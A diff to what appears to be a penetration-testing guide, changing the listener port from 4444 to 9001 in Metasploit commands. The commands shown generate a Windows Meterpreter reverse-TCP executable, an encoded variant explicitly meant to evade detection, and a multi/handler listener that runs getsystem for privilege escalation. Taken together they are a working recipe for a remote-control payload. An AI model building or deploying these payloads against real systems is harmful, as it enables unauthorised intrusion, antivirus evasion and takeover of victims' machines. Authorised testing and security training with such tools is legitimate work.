@@ -7,7 +7,7 @@
    ```
 2. **Generate Basic Payload**:
    ```
-   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -f exe -o payload.exe
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=9001 -f exe -o payload.exe
    ```
    - `-p`: Payload type (Meterpreter reverse TCP for Windows).
    - `LHOST`: Attacker's IP.
@@ -16,7 +16,7 @@
    - `-o`: Output file path.
 3. **Generate Encoded Payload** (Evade Detection):
    ```
-   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe
+   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=9001 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe
    ```
    - `-a x86`: 32-bit architecture.
    - `-b "\x00"`: Avoid bad characters.
@@ -35,7 +35,7 @@ Run `msfconsole` with privilege escalation.
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST <your_IP>
- set LPORT 4444
+ set LPORT 9001
  set AutoRunScript getsystem
  exploit
  ```
